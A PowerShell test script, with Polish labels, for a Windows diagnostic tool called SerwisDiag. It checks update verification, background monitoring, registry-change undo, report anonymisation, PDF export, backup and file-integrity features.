Assert-That 'aktualizacje: pobranie i kontrola sumy oraz wersji' ((Test-Path -LiteralPath $fpath) -and (Get-SdFileSha256 $fpath) -eq (Get-SdFileSha256 $fakeSetup))
[IO.File]::WriteAllText(($fakeSetup + '.sha256'), ('0' * 64 + '  SerwisDiag-T-setup.exe'))
$ferr = ''
try { [void](Get-SdUpdatePackage -Release $frel -Dir (Join-Path $ud0 'zla-suma')) } catch { $ferr = $_.Exception.Message }
Assert-That 'aktualizacje: zla suma - przerwane, plik usuniety' ($ferr -match 'Suma kontrolna' -and -not (Test-Path -LiteralPath (Join-Path $ud0 'zla-suma\SerwisDiag-T-setup.exe'))) $ferr
[IO.File]::WriteAllText(($fakeSetup + '.sha256'), ((Get-SdFileSha256 $fakeSetup) + '  SerwisDiag-T-setup.exe'))
$frel.Latest = '99.1.0'
$ferr = ''
try { [void](Get-SdUpdatePackage -Release $frel -Dir (Join-Path $ud0 'zla-wersja')) } catch { $ferr = $_.Exception.Message }
Assert-That 'aktualizacje: inny numer wersji w pliku - przerwane' ($ferr -match 'inny numer wersji') $ferr
$ferr = ''
try { [void](Get-SdUpdatePackage -Release ([pscustomobject]@{ Latest = '1.0'; Setup = ''; SetupSha = '' })) } catch { $ferr = $_.Exception.Message }
Assert-That 'aktualizacje: wydanie bez instalatora' ($ferr -match 'nie zawiera instalatora') $ferr
$ir2 = Join-Path $ud0 'program'
[void](New-Item -ItemType Directory -Path $ir2 -Force)
Assert-Equal 'tryb instalacji: kopia przenosna' (Get-SdInstallMode $ir2) ''
[IO.File]::WriteAllText((Join-Path $ir2 'instalacja.ini'), "[SerwisDiag]`r`nWersja=1.4.0`r`nTryb=wszyscy`r`n")
Assert-Equal 'tryb instalacji: dla wszystkich (zapis instalatora)' (Get-SdInstallMode $ir2) 'allusers'
[IO.File]::WriteAllText((Join-Path $ir2 'instalacja.ini'), "[SerwisDiag]`r`nWersja=1.4.0`r`nTryb=biezacy`r`n")
Assert-Equal 'tryb instalacji: biezacy uzytkownik' (Get-SdInstallMode $ir2) 'currentuser'
[IO.File]::WriteAllText((Join-Path $ir2 'instalacja.ini'), "[SerwisDiag]`r`nWersja=1.3.0`r`n")
Assert-Equal 'tryb instalacji: starsza instalacja poza Program Files' (Get-SdInstallMode $ir2) 'currentuser'
$ua = Get-SdUpdateArguments -Mode 'allusers' -Relaunch
Assert-That 'aktualizacje: parametry instalatora' ($ua -match '/SILENT' -and $ua -match '/SUPPRESSMSGBOXES' -and $ua -match '/ALLUSERS' -and $ua -match '/RELAUNCH=1' -and (Get-SdUpdateArguments -Mode 'currentuser') -match '/CURRENTUSER$')
$savedUrl = $global:SdProjectUrl
$global:SdProjectUrl = 'https://github.com/konto/serwis-diag'
$usp = Join-Path $ud0 'aktualizacje.json'
$uset = @{ AutoUpdateCheck = $true }
Assert-That 'aktualizacje: pierwsze sprawdzenie od razu' (Test-SdUpdateCheckDue -Root $ir2 -Settings $uset -StatePath $usp)
Save-SdUpdateCheckState ([pscustomobject]@{ Latest = '1.9.0'; Newer = $true }) -StatePath $usp -Notified '1.9.0'
Save-SdUpdateCheckState ([pscustomobject]@{ Latest = '1.9.0'; Newer = $true }) -StatePath $usp
Assert-That 'aktualizacje: raz na dobe, zapamietane powiadomienie' (-not (Test-SdUpdateCheckDue -Root $ir2 -Settings $uset -StatePath $usp) -and (Test-SdUpdateCheckDue -Root $ir2 -Settings $uset -StatePath $usp -Now (Get-Date).AddHours(25)) -and [string](Read-SdJsonFile $usp).notified -eq '1.9.0')
Assert-That 'aktualizacje: bez sprawdzania w wersji przenosnej i po wylaczeniu' (-not (Test-SdUpdateCheckDue -Root (Join-Path $ud0 'zrodlo') -Settings $uset -StatePath $usp -Now (Get-Date).AddDays(3)) -and -not (Test-SdUpdateCheckDue -Root $ir2 -Settings @{ AutoUpdateCheck = $false } -StatePath $usp -Now (Get-Date).AddDays(3)))
$global:SdProjectUrl = $savedUrl
Assert-Equal 'wersja programu na dysku' (Get-SdVersionOnDisk $SdRoot) $global:SdVersion
Assert-That 'ustawienia: domyslnie sprawdzanie aktualizacji' ((Get-SdDefaultSettings).AutoUpdateCheck -eq $true)

# ---------------------------------------------------------------- 1.4: monitorowanie w tle
$selM = Get-SdSelectedChecks -Level Quick -Tests @() -Only $global:SdMonitorChecks   # zwraca ArrayList (return , $lista) - bez @()
Assert-Equal 'monitor: wszystkie testy z listy istnieja i sa szybkie' $selM.Count $global:SdMonitorChecks.Count
$t0m = Get-Date '2026-10-26 12:00'
$mf = { param($id, $t, $st, $le) [pscustomobject]@{ CheckId = $id; Title = $t; Status = $st; Value = 'v'; Advice = 'a'; LastEvent = $le } }
$mprev = @(
    [pscustomobject]@{ key = 'ev.crash|nieoczekiwane restarty (bez bsod)'; title = 'Nieoczekiwane restarty (bez BSOD)'; status = 'warn' }
    [pscustomobject]@{ key = 'st.volumes|wolumin c:'; title = 'Wolumin C:'; status = 'warn' }
    [pscustomobject]@{ key = 'ev.services|błędy usług'; title = 'Błędy usług'; status = 'warn' }
    [pscustomobject]@{ key = 'se.av|microsoft defender'; title = 'Microsoft Defender'; status = 'warn' })
$mnow = @(
    (& $mf 'ev.crash' 'Nieoczekiwane restarty (bez BSOD)' 'warn' $t0m.AddDays(-3))
    (& $mf 'st.volumes' 'Wolumin C:' 'crit' $null)
    (& $mf 'ev.services' 'Błędy usług' 'warn' $t0m.AddHours(1))
    (& $mf 'ev.hardware' 'Błędy dysku i systemu plików' 'warn' $t0m.AddDays(-1))
    (& $mf 'se.firewall' 'Zapora' 'ok' $null))
$mch = Get-SdMonitorChanges -Previous $mprev -Findings $mnow -LastCheck $t0m
Assert-Equal 'monitor: nowe = pogorszony, powtorzony i nowy (bez starych zdarzen)' ((@($mch.New) | ForEach-Object { $_.Title }) -join ', ') 'Wolumin C:, Błędy usług, Błędy dysku i systemu plików'
Assert-That 'monitor: biezace problemy i ustapione' (@($mch.Problems).Count -eq 4 -and (@($mch.Resolved) -join ',') -eq 'Microsoft Defender')
Assert-That 'monitor: kolor ikony' ((Get-SdMonitorLevel $mch.Problems) -eq 'crit' -and (Get-SdMonitorLevel @($mnow[0])) -eq 'warn' -and (Get-SdMonitorLevel @()) -eq 'ok')
$msp = Join-Path $ud0 'monitor.json'
Save-SdMonitorState -Path $msp -Problems $mch.Problems -When $t0m -Interval 240
$mst = Read-SdMonitorState $msp
Assert-That 'monitor: zapis i odczyt stanu' ($mst.LastCheck -eq $t0m -and $mst.Interval -eq 240 -and @($mst.Problems).Count -eq 4 -and $mst.Problems[0].key -eq 'ev.crash|nieoczekiwane restarty (bez bsod)' -and $mst.Problems[2].lastEvent -eq $t0m.AddHours(1).ToString('s'))
Set-SdMonitorInterval -Minutes 60 -Path $msp
$mst2 = Read-SdMonitorState $msp
Assert-That 'monitor: zmiana czestotliwosci bez utraty stanu' ($mst2.Interval -eq 60 -and $mst2.LastCheck -eq $t0m -and @($mst2.Problems).Count -eq 4)
$mch2 = Get-SdMonitorChanges -Previous $mst2.Problems -Findings $mnow -LastCheck $t0m.AddHours(2)
Assert-Equal 'monitor: kolejne sprawdzenie bez zmian - bez powiadomien' @($mch2.New).Count 0
Assert-Equal 'monitor: czestotliwosci' ((@(60, 240, 1440) | ForEach-Object { Get-SdMonitorIntervalText $_ }) -join ' / ') 'co godzinę / co 4 godziny / raz na dobę'
$mx = [xml](New-SdMonitorTaskXml -Command 'C:\Program Files\SerwisDiag\SerwisDiagMonitor.exe' -Arguments '-a "b & c"')
$mns = New-Object System.Xml.XmlNamespaceManager($mx.NameTable)
$mns.AddNamespace('t', 'http://schemas.microsoft.com/windows/2004/02/mit/task')
Assert-That 'monitor: zadanie Harmonogramu (logowanie, grupa Uzytkownicy, najwyzsze dostepne uprawnienia)' ($mx.SelectSingleNode('//t:LogonTrigger', $mns) -and $mx.SelectSingleNode('//t:GroupId', $mns).InnerText -eq 'S-1-5-32-545' -and $mx.SelectSingleNode('//t:RunLevel', $mns).InnerText -eq 'HighestAvailable' -and $mx.SelectSingleNode('//t:Command', $mns).InnerText -eq 'C:\Program Files\SerwisDiag\SerwisDiagMonitor.exe' -and $mx.SelectSingleNode('//t:Arguments', $mns).InnerText -eq '-a "b & c"')
Assert-That 'monitor: uruchamianie przez SerwisDiagMonitor.exe, bez niego przez PowerShell' ((Get-SdMonitorLauncher $SdRoot).File -like '*\SerwisDiagMonitor.exe' -and (Get-SdMonitorLauncher $ir2).Arguments -match '-Monitor$')
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$mic = New-SdMonitorIcons $SdRoot
Assert-That 'monitor: ikony stanu' (@('ok', 'busy', 'warn', 'crit' | Where-Object { $mic[$_] -and $mic[$_].Width -ge 16 }).Count -eq 4)
Remove-Item -LiteralPath $ud0 -Recurse -Force

# ---------------------------------------------------------------- 1.1: tryb ograniczony PowerShell (AppLocker / App Control)
$psExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
$clm = Invoke-Native -File $psExe -Arguments ('-NoProfile -ExecutionPolicy Bypass -Command "$ExecutionContext.SessionState.LanguageMode = ''ConstrainedLanguage''; & ''' + (Join-Path $SdRoot 'SerwisDiag.ps1') + ''' -NoGui; exit $LASTEXITCODE"') -TimeoutSec 60
Assert-That 'tryb ograniczony: czytelny komunikat i kod 5' ($clm.ExitCode -eq 5 -and $clm.StdOut -match 'ograniczonym \(ConstrainedLanguage\)') ('kod ' + $clm.ExitCode)

# ---------------------------------------------------------------- 1.1: cofanie napraw (rejestr testowy w HKCU)
$uk = 'HKCU:\Software\SerwisDiagUndoTest_' + [guid]::NewGuid().ToString('N')
[void](New-Item -Path $uk -Force)
[void](New-ItemProperty -LiteralPath $uk -Name 'Dw' -Value 5 -PropertyType DWord)
[void](New-ItemProperty -LiteralPath $uk -Name 'Bin' -Value ([byte[]](2, 0, 0, 0)) -PropertyType Binary)
[void](New-ItemProperty -LiteralPath $uk -Name 'Exp' -Value '%SystemRoot%\x.exe' -PropertyType ExpandString)
[void](New-ItemProperty -LiteralPath $uk -Name 'Del' -Value 'usun' -PropertyType String)
$global:SdUndoTestKey = $uk
$savedFixes = $global:SdFixes
$global:SdFixes = New-Object System.Collections.ArrayList
Register-Fix -Id 't.undo' -Group 'G' -Title 'Zmiany testowe' -Detect { [pscustomobject]@{ Problem = 'p' } } -Apply {
    param($Data, $Log)
    $p = $global:SdUndoTestKey
    Set-SdRegValueLogged -Path $p -Name 'Dw' -Value 9 -Log $Log
    Set-SdRegValueLogged -Path $p -Name 'Bin' -Value ([byte[]](3, 0, 0, 0, 1, 2)) -Type Binary -Log $Log
    Set-SdRegValueLogged -Path $p -Name 'Exp' -Value 'C:\inny.exe' -Type String -Log $Log
    Set-SdRegValueLogged -Path $p -Name 'Nowa' -Value 1 -Log $Log
    Set-SdRegValueLogged -Path $p -Name 'Zmieniona' -Value 1 -Log $Log
    Remove-SdRegValueLogged -Path $p -Name 'Del' -Log $Log
    $before = Get-SdRegSnapshot $p @('Snap')
    [void](New-ItemProperty -LiteralPath $p -Name 'Snap' -Value 7 -PropertyType DWord -Force)
    Add-SdRegSnapshotUndo $p $before
    throw 'przerwana w polowie'
}
$ur = @(Invoke-SdFixes -Candidates @(Get-SdFixCandidates -Context @{ Result = $null; IsAdmin = $true; Offline = $false }))
$global:SdFixes = $savedFixes
Assert-That 'cofanie: rekordy zebrane mimo bledu naprawy' ($ur[0].Result -eq 'error' -and @($ur[0].Undo).Count -eq 7)
$ud = Join-Path ([IO.Path]::GetTempPath()) ('sdundo-' + [guid]::NewGuid().ToString('N'))
$ulp = Save-SdRepairLog -Results $ur -Meta @{ Ticket = 'U-1' } -OutDir $ud
$ujp = [IO.Path]::ChangeExtension($ulp, '.json')
Assert-Equal 'dziennik napraw: pierwszy wiersz bez doklejonych pol' ([IO.File]::ReadAllLines($ulp)[0]) ('DZIENNIK NAPRAW - SerwisDiag ' + $global:SdVersion)
Assert-That 'cofanie: dziennik JSON obok tekstowego' ((Test-Path -LiteralPath $ujp) -and @(Find-SdRepairJson -Dir $ud).Count -eq 1)
$ulog = Read-SdRepairJson $ujp
$uitems = @(Get-SdUndoItems $ulog)
Assert-That 'cofanie: pozycje w odwrotnej kolejnosci' ($uitems.Count -eq 7 -and $uitems[0].Record.Name -eq 'Snap' -and $uitems[6].Record.Name -eq 'Dw')
Set-ItemProperty -LiteralPath $uk -Name 'Zmieniona' -Value 2
$ures = @(Invoke-SdUndo $uitems)
$k = Get-Item -LiteralPath $uk
$names = @($k.GetValueNames())
Assert-That 'cofanie: DWORD, Binary i ExpandString przywrocone 1:1' ($k.GetValue('Dw') -eq 5 -and (@($k.GetValue('Bin')) -join ',') -eq '2,0,0,0' -and $k.GetValue('Exp', $null, 'DoNotExpandEnvironmentNames') -eq '%SystemRoot%\x.exe' -and [string]$k.GetValueKind('Exp') -eq 'ExpandString')
Assert-That 'cofanie: usunieta wartosc wraca, dodana znika' ($k.GetValue('Del') -eq 'usun' -and $names -notcontains 'Nowa' -and $names -notcontains 'Snap')
Assert-That 'cofanie: wartosc zmieniona po naprawie pominieta' ($k.GetValue('Zmieniona') -eq 2 -and @($ures | Where-Object { $_.Result -eq 'skip' -and $_.Text -match 'Zmieniona' }).Count -eq 1)
Assert-Equal 'cofanie: wyniki' (@($ures | Where-Object { $_.Result -eq 'ok' }).Count) 6
$uul = Save-SdUndoLog -Results $ures -RepairJsonPath $ujp
Assert-That 'cofanie: dziennik cofniecia' ((Split-Path $uul -Leaf) -like 'U-1_*_cofniecie_*.txt' -and [IO.File]::ReadAllLines($uul)[0] -eq ('COFNIĘCIE NAPRAW - SerwisDiag ' + $global:SdVersion))
Assert-That 'cofanie: opisy uslugi i zapory' ((Get-SdUndoText ([pscustomobject]@{ Kind = 'svc'; Name = 'wuauserv'; Old = 'Disabled' })) -match 'wuauserv' -and (Get-SdUndoText ([pscustomobject]@{ Kind = 'firewall'; Profiles = @('Public') })) -match 'Public')
Assert-Equal 'cofanie: nieznany rodzaj zmiany pominiety' (Invoke-SdUndoRecord ([pscustomobject]@{ Kind = 'xyz' })).Result 'skip'
Remove-Item -LiteralPath $uk -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath $ud -Recurse -Force -ErrorAction SilentlyContinue

# ---------------------------------------------------------------- 1.1: raport anonimowy
$at = ConvertTo-SdAnonymousText ('Komputer PC-JANEK, profil C:\Users\Jan Kowalski\AppData, inny C:\Users\ewa\x.exe, publiczny C:\Users\Public\a.exe, MAC 3C-52-82-AA-BB-CC, IP 192.168.1.15, DNS 8.8.8.8, maska 255.255.255.0, ' +
    'klucz ABCDE-12345-FGHIJ-67890-KLMNO, mail jan.k@example.pl, SID S-1-5-21-111-222-333-1001, IPv6 fe80::1c2d:3e4f:5a6b:7c8d%12, czas 12:30, wersja 10.0.26100.1, uprawnienia administratora' + "`nSieć (SSID): Dom_Kowalskich") @('PC-JANEK', 'Jan Kowalski')
foreach ($leak in 'PC-JANEK', 'Kowalski', 'ewa', '3C-52-82', '192.168.1.15', 'ABCDE-12345', 'jan.k@', '111-222-333', 'fe80::', 'Dom_Kowalskich') {
    Assert-That ('anonimizacja usuwa: ' + $leak) ($at -notmatch [regex]::Escape($leak)) $at
}
foreach ($keep in '8.8.8.8', '255.255.255.0', '12:30', '10.0.26100.1', 'administratora', 'C:\Users\Public\a.exe') {
    Assert-That ('anonimizacja zostawia: ' + $keep) ($at -match [regex]::Escape($keep)) $at
}
$global:SD = New-SdContext -Root $SdRoot
$global:SD.Meta['ComputerName'] = 'PC-ANON'; $global:SD.Meta['Serial'] = 'SN12345XYZ'; $global:SD.Meta['Customer'] = 'Anna Nowak'; $global:SD.Meta['Model'] = 'Lenovo X'
Add-Finding 'Wynik zwykly' -Category 'system' -Id 'sys.x' -Status warn -Value 'Komputer PC-ANON klienta Anna Nowak' -Details 'numer SN12345XYZ'
Add-Finding 'Klucz OEM' -Category 'updates' -Id 'up.x' -Status info -Value 'ABCDE-12345-FGHIJ-67890-KLMNO' -Private
Add-Table 'Dyski' -Category 'storage' -Rows @([pscustomobject]@{ Model = 'Dysk A'; 'Numer seryjny' = 'DSK-998877' }, [pscustomobject]@{ Model = 'DSK-998877 (kopia w opisie)'; 'Numer seryjny' = '' })
$an = New-SdAnonymousResult (Get-SdResult)
$anHtml = New-SdHtmlReport -Result $an -Mode Technical
Assert-That 'raport anonimowy: tytul i brak wynikow prywatnych' ($anHtml -match 'Raport diagnostyczny \(anonimowy\)' -and @($an.Findings).Count -eq 1 -and $anHtml -notmatch 'Klucz OEM')
foreach ($leak in 'PC-ANON', 'SN12345XYZ', 'Anna Nowak', 'DSK-998877') { Assert-That ('raport anonimowy usuwa: ' + $leak) ($anHtml -notmatch [regex]::Escape($leak)) }
Assert-That 'raport anonimowy: model komputera zostaje' ($anHtml -match 'Lenovo X' -and -not $an.Meta.ContainsKey('Serial') -and -not $an.Meta.ContainsKey('Customer'))
$global:SD = New-SdContext -Root $SdRoot

# ---------------------------------------------------------------- 1.1: odmiana w raportach, PDF
$global:SD = New-SdContext -Root $SdRoot
Add-Finding 'Ostrzezenie' -Category 'system' -Id 'sys.x' -Status warn -Value 'x'
$h1 = New-SdHtmlReport -Result (Get-SdResult) -Mode Customer
Add-Finding 'Ostrzezenie 2' -Category 'system' -Id 'sys.x' -Status warn -Value 'x'
$h2 = New-SdHtmlReport -Result (Get-SdResult) -Mode Customer
Assert-That 'raport: odmiana liczby zalecen' ($h1 -match '>1 zalecenie<' -and $h2 -match '>2 zalecenia<')
$global:SD = New-SdContext -Root $SdRoot
if (Find-SdPdfBrowser) {
    $pd = Join-Path ([IO.Path]::GetTempPath()) ('sdpdf-' + [guid]::NewGuid().ToString('N'))
    [void](New-Item -ItemType Directory -Path $pd -Force)
    $ph = Join-Path $pd 'raport test.html'
    [IO.File]::WriteAllText($ph, $h2, (New-Object System.Text.UTF8Encoding($true)))
    $pr = ConvertTo-SdPdf -HtmlPath $ph
    $pdfOk = $false; $a4 = $false
    if ($pr.Ok) {
        $pb = [IO.File]::ReadAllBytes($pr.Path)
        $pdfOk = ([Text.Encoding]::ASCII.GetString($pb, 0, 5) -eq '%PDF-')
        $a4 = ([Text.Encoding]::ASCII.GetString($pb) -match '/MediaBox\s*\[\s*0\s+0\s+59[45]\.\d*\s+84[12]\.\d*')
    }
    Assert-That 'PDF: plik A4 ze sciezki ze spacja' ($pdfOk -and $a4) $pr.Error
    Remove-Item -LiteralPath $pd -Recurse -Force -ErrorAction SilentlyContinue
} else { Write-Host '(PDF: brak Edge/Chrome - test pominiety)' -ForegroundColor DarkGray }

# ---------------------------------------------------------------- 1.1: kopia przed reinstalacja (bez administratora: lista programow)
Assert-Equal 'kopia: elementy domyslne' ((Get-SdBackupIncludeList '') -join ',') 'drivers,programs,system'
Assert-Equal 'kopia: wybrane elementy w stalej kolejnosci' ((Get-SdBackupIncludeList 'wifi, PROGRAMS, nieznany') -join ',') 'programs,wifi'
$bd = Join-Path ([IO.Path]::GetTempPath()) ('sdbk-' + [guid]::NewGuid().ToString('N'))
$bk = Invoke-SdBackup -Dest $bd -Include @('programs')
$bkr = [IO.File]::ReadAllLines((Join-Path $bk.Dir 'CZYTAJ.txt'))
Assert-That 'kopia: lista programow i instrukcja' ((Test-Path -LiteralPath (Join-Path $bk.Dir 'programy.csv')) -and (Test-Path -LiteralPath (Join-Path $bk.Dir 'programy.html')) -and @($bk.Parts | Where-Object { $_.Key -eq 'programs' -and $_.Result -eq 'ok' }).Count -eq 1)
Assert-That 'kopia: naglowek instrukcji w osobnych wierszach' ($bkr[0] -eq ('KOPIA PRZED REINSTALACJĄ WINDOWS - SerwisDiag ' + $global:SdVersion) -and $bkr[1] -like 'Komputer: *')
Assert-That 'kopia: ostrzezenie o dysku systemowym' (@($bk.Warnings | Where-Object { $_ -match 'dysku systemowym' }).Count -eq 1)
Remove-Item -LiteralPath $bd -Recurse -Force -ErrorAction SilentlyContinue
# limit dlugosci sciezki przy eksporcie sterownikow (DISM przerywa eksport bledem 206)
$usbDir = 'E:\DESKTOP-ABC1234_20261025-1711_kopia\sterowniki'
$drvInfo = [pscustomobject]@{ Count = 110; Bytes = 8.2GB; MaxRel = 147; Package = 'udcdriver.inf'; Source = 'test' }
$lp1 = Test-SdDriverExport -DriverDir $usbDir -Info $drvInfo -FreeBytes 30GB
$lp2 = Test-SdDriverExport -DriverDir ('C:\' + ('a' * 120) + '\DESKTOP-ABC1234_20261025-1711_kopia\sterowniki') -Info $drvInfo -FreeBytes 30GB
$lp3 = Test-SdDriverExport -DriverDir $usbDir -Info $drvInfo -FreeBytes 4GB
Assert-That 'kopia: krotka sciezka (pendrive) i dosc miejsca' ($lp1.Ok -and $lp1.Need -eq ($usbDir.Length + 1 + 147)) ('potrzeba ' + $lp1.Need)
Assert-That 'kopia: za dluga sciezka wykryta przed eksportem' (-not $lp2.Ok -and $lp2.Need -gt 259 -and $lp2.Message -match 'udcdriver\.inf' -and $lp2.Message -match '259')
Assert-That 'kopia: za malo miejsca na pendrive wykryte przed eksportem' (-not $lp3.Ok -and $lp3.Message -match 'za mało miejsca' -and $lp3.Message -match '110 pakietów') $lp3.Message
$swDrv = [System.Diagnostics.Stopwatch]::StartNew()
$qi = Get-SdDriverExportInfo
$oemCount = @(Get-ChildItem -LiteralPath (Join-Path $env:SystemRoot 'INF') -Filter 'oem*.inf' -File).Count
Assert-That 'kopia: pakiety sterownikow do eksportu rozpoznane bez administratora (kazdy oem*.inf)' ($qi.Count -eq $oemCount -and ($oemCount -eq 0 -or ($qi.MaxRel -gt 0 -and $qi.Bytes -gt 0))) ('pakietow {0}, oem*.inf {1}' -f $qi.Count, $oemCount)
Assert-That 'kopia: rozpoznanie pakietow w kilka sekund' ($swDrv.Elapsed.TotalSeconds -lt 15) ([string][math]::Round($swDrv.Elapsed.TotalSeconds, 1))
Assert-That 'kopia: kody bledow DISM po polsku' ((Get-SdDismExportError 206) -match 'za długa' -and (Get-SdDismExportError 112) -match 'miejsca' -and (Get-SdDismExportError 1234 'linia') -match '0x000004D2')
Assert-That 'kopia: nazwa folderu kopii' ((Get-SdBackupDirName (New-Object DateTime(2026, 10, 25, 17, 11, 0))) -eq ($env:COMPUTERNAME + '_20261025-1711_kopia'))

# ---------------------------------------------------------------- integralnosc plikow programu
$ir = Join-Path ([IO.Path]::GetTempPath()) ('sdint-' + [guid]::NewGuid().ToString('N'))
foreach ($d in 'lib', 'checks', 'data') { [void](New-Item -ItemType Directory -Path (Join-Path $ir $d) -Force) }
[IO.File]::WriteAllText((Join-Path $ir 'SerwisDiag.ps1'), 'x')
[IO.File]::WriteAllText((Join-Path $ir 'lib\Core.ps1'), 'core')
[IO.File]::WriteAllText((Join-Path $ir 'checks\10-a.ps1'), 'a')
Assert-Equal 'integralnosc: brak manifestu' (Test-SdIntegrity $ir).Status 'nomanifest'
New-SdManifest -Root $ir
Assert-Equal 'integralnosc: zgodna' (Test-SdIntegrity $ir).Status 'ok'
[IO.File]::WriteAllText((Join-Path $ir 'checks\10-a.ps1'), 'a-zmieniony')
[IO.File]::WriteAllText((Join-Path $ir 'checks\99-obcy.ps1'), 'zly')
Remove-Item -LiteralPath (Join-Path $ir 'lib\Core.ps1')
$it = Test-SdIntegrity $ir
Assert-That 'integralnosc: zmieniony, dodatkowy i brakujacy plik' ($it.Status -eq 'changed' -and ($it.Changed -join ',') -eq 'checks\10-a.ps1' -and ($it.Extra -join ',') -eq 'checks\99-obcy.ps1' -and ($it.Missing -join ',') -eq 'lib\core.ps1') $it.Summary
Remove-Item -LiteralPath $ir -Recurse -Force
Assert-Equal 'integralnosc: pliki programu zgodne z manifestem (uruchom tools\check.ps1 po zmianach)' (Test-SdIntegrity $SdRoot).Status 'ok'

Write-Host ''
Write-Host ('Testy: zaliczone {0}, niezaliczone {1}' -f $script:pass, $script:fail) -ForegroundColor $(if ($script:fail -eq 0) { 'Green' } else { 'Red' })
if ($script:fail -gt 0) { exit 1 } else { exit 0 }
